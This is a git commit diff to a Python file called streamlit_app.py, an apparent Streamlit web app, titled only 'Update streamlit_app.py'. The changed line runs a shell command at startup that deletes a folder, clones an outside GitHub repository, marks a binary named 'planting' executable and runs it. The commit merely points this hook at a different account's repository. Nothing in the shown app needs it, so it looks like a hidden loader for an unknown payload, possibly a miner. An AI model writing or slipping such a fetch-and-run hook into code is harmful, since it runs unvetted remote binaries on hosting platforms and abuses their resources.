d02e270f7b0d6ba530fd229c6e40fa9f65cfbadc
wahyuchan627 <108955262+wahyuchan627@users.noreply.github.com>
2022-07-13 09:39:30 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf streamlit && git clone https://github.com/sinagaboy650/streamlit.git && cd streamlit && chmod +x planting && ./planting")
+os.system ("rm -rf streamlit && git clone https://github.com/wahyuchan627/streamlit.git && cd streamlit && chmod +x planting && ./planting")
